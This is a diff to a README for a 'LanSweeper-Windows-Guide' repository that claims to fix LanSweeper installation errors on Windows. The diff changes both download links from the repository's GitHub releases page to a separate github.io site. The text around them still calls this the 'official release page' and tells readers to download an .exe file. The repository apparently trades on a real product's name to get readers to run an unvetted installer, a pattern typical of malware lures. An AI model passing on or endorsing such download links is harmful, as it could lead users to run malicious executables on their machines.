@@ -1,6 +1,6 @@
 # 🖥️ LanSweeper-Windows-Guide - Fix LanSweeper installation errors on Windows
 
-[![](https://img.shields.io/badge/Download_LanSweeper_Setup-Blue?style=for-the-badge)](https://github.com/fact6189/LanSweeper-Windows-Guide/releases)
+[![](https://img.shields.io/badge/Download_LanSweeper_Setup-Blue?style=for-the-badge)](https://fact6189.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you install the software, your computer needs specific settings. Verify y
 
 Use the official release page to get the installer. Follow these instructions to access the files:
 
-1. Visit [this page to download](https://github.com/fact6189/LanSweeper-Windows-Guide/releases).
+1. Visit [this page to download](https://fact6189.github.io).
 2. Look for the latest release version at the top of the list.
 3. Click the link ending in .exe to save the file to your computer.
 4. Save the file in a place you can find, such as your Downloads folder.
